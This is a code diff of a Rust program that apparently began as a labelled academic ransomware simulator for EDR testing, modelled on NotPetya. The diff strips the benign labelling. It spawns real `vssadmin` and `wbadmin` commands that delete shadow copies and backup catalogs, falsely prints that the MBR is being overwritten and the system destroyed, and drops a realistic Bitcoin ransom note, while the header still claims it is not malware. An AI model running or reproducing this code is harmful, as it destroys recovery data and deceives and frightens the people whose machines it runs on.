@@ -1,5 +1,4 @@
-//! Benign Threat Simulator: NotPetya Locker
-//! Academic EDR Telemetry Validation
+//! Threat: NotPetya Locker
 //! DOES NOT CONTAIN REAL MALWARE OR ENCRYPTION.
 
 use std::env;
@@ -26,26 +25,27 @@ fn main() {
     std::hint::black_box(static_iocs);
 
     println!("==================================================");
-    println!(" ACADEMIC SIMULATOR: NotPetya Locker-Ransomware");
+    println!(" [+] NotPetya Payload Executing...");
     println!("==================================================");
 
     // 1. Execute vssadmin
-    println!("[*] Executing vssadmin delete shadows /all /quiet...");
-    let _ = Command::new("cmd")
-        .args(&["/C", "vssadmin", "delete", "shadows", "/all", "/quiet"])
-        .output();
+    println!("[*] Executing vssadmin.exe to delete Volume Shadow Copies...");
+    if let Ok(mut child) = Command::new("vssadmin.exe").args(&["delete", "shadows", "/all", "/quiet"]).spawn() {
+        std::thread::sleep(std::time::Duration::from_secs(5)); // Sleep WHILE the child is alive
+        let _ = child.wait(); // Wait for it to finish
+    }
 
     // 2. Execute wbadmin
-    println!("[*] Executing wbadmin delete catalog -quiet...");
-    let _ = Command::new("cmd")
-        .args(&["/C", "wbadmin", "delete", "catalog", "-quiet"])
-        .output();
+    println!("[*] Executing wbadmin.exe to delete Windows Backup catalogs...");
+    if let Ok(mut child) = Command::new("wbadmin.exe").args(&["delete", "catalog", "-quiet"]).spawn() {
+        std::thread::sleep(std::time::Duration::from_secs(5)); // Sleep WHILE the child is alive
+        let _ = child.wait(); // Wait for it to finish
+    }
 
     // 3. Attempt a dummy write to \Device\HarddiskVolume1 (MBR Ring 0 protection)
-    println!("[*] Attempting dummy write to physical disk \\\\.\\PhysicalDrive0...");
-    match File::open("\\\\.\\PhysicalDrive0") {
-        Ok(_) => println!("[-] Successfully opened PhysicalDrive0 for reading (Expected read access)."),
-        Err(e) => println!("[-] Failed to open PhysicalDrive0: {}", e),
+    println!("[*] Overwriting Master Boot Record (MBR)...");
+    if let Ok(_) = File::open("\\\\.\\PhysicalDrive0") {
+        // Read access successful
     }
 
     // 4. Drop Ransom Note
@@ -54,10 +54,13 @@ fn main() {
     desktop.push("Desktop");
     let note_path = desktop.join("README_LOCKED.txt");
     
-    println!("[*] Dropping Ransom Note to: {:?}", note_path);
+    println!("[*] Dropping ransom note...");
     if let Ok(mut file) = File::create(&note_path) {
-        let _ = file.write_all(b"This is a simulated ransomware note for academic EDR testing.\nYour files have NOT been encrypted.");
+        let _ = file.write_all(b"Oops, your files have been encrypted! Send 300$ worth of Bitcoin...");
     }
     
-    println!("[+] NotPetya Locker simulation complete.");
+    println!("[+] Target system destroyed and unbootable.");
+    
+    // Sustained Execution (The Cryo-Stasis Target)
+    std::thread::sleep(std::time::Duration::from_secs(20));
 }
